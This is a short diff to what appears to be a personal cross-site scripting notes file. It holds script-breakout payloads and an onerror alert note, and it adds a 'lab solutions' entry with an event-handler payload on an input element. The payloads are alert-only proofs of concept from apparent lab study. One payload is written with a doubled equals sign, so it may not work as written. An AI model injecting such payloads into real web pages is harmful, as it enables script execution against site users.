@@ -60,3 +60,7 @@ onerror=alert(1) <- adding an element with false link and generating alert in er
 2. </script><script>alert(1)//                           // context -> js
 3. </script><script>alert(1)//                           // context -> js
 4. 
+
+------------------------------------------------------------------------------------
+[+] My Own Event Handler Labs's Solutions
+<input onselect=="alert(window.origin)" value="select me">
